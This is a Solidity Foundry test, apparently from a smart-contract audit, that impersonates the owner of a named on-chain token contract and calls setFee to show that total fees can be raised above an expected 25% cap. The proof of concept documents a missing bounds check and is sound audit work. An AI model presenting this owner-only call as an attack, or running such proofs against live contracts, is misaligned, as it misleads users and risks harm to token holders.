// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INCOME {
    function owner() external view returns (address);
    function setFee(uint256 _bnbRewardFee, uint256 _liquidityFee, uint256 _marketingFee) external;
    function totalFees() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);
    INCOME income;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        income = INCOME(TARGET);
        owner = income.owner();

        vm.label(TARGET, "INCOME Contract");
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // As the owner, we can set fees without any upper limit check.
                vm.startPrank(owner);

                // Set fees to 20% + 20% + 20% = 60%, which is > 25%.
                income.setFee(20, 20, 20);

                vm.stopPrank();

                // Verify that the total fees are now 60, which is greater than the expected max of 25.
                assertGt(income.totalFees(), 25);
                console.log("New totalFees: %d", income.totalFees());
        assertGt(income.totalFees(), 25, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

